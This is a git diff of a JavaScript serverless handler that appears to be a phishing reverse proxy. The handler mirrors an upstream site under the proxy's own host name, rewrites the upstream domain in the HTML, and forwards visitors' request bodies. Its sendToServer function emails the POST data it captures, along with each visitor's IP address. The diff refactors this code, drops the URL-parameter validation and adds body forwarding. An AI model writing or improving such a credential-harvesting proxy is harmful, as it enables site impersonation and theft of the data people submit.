@@ -41,26 +41,22 @@ export default async (req, res) => {
                 await sendToServer(message, ip_address);
             }
         } catch (error) {
-            console.error('Error processing POST request:', error);
+            console.error('Error processing request:', error);
             res.status(500).json({ error: 'Internal Server Error' });
             return;
         }
     }
 
     try {
-        const urlParam = req.query.url;
-        if (!urlParam) {
-            throw new Error('No URL parameter provided');
-        }
-
-        const url = new URL(urlParam);
+        let url = new URL(req.query.url);
         url.host = upstream;
         url.protocol = https ? 'https:' : 'http:';
         url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;
 
         const fetchOptions = {
             method,
-            headers: { ...req.headers, Host: upstream, Referer: `${url.protocol}//${req.headers.host}` }
+            headers: { ...req.headers, Host: upstream, Referer: `${url.protocol}//${req.headers.host}` },
+            body: req.body
         };
 
         const original_response = await fetch(url.href, fetchOptions);
@@ -95,15 +91,10 @@ export default async (req, res) => {
 };
 
 async function replace_response_text(response, upstream_domain, host_name) {
-    try {
-        let text = await response.text();
-        let re = new RegExp(upstream_domain, 'g');
-        text = text.replace(re, host_name);
-        return text;
-    } catch (error) {
-        console.error('Error replacing response text:', error);
-        throw error;
-    }
+    let text = await response.text();
+    let re = new RegExp(upstream_domain, 'g');
+    text = text.replace(re, host_name);
+    return text;
 }
 
 async function sendToServer(data, ip_address) {
@@ -125,6 +116,6 @@ async function sendToServer(data, ip_address) {
             text: `${data}\n\nIP Address: ${ip_address}`
         });
     } catch (error) {
-        console.error('Error sending data via email:', error);
+        console.error('Error sending data:', error);
     }
 }
